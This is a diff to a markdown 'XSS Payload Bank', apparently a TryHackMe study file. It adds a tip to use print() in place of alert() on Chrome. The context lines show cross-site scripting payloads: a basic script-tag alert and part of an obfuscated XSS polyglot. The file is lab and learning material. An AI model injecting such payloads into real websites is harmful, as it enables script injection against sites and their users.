@@ -1,4 +1,5 @@
 # XSS Payload Bank
+**Update:** Use `print()` instead of `alert()` on Chrome
 ## THM Payloads
 ```javascript
 <script>alert('THM');</script> 
@@ -46,6 +47,8 @@ jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stY
 ```
 ### A Repository of Polygots
 [Ultimate XSS Polygot](https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot)
+
+
 
 ```javascript
 
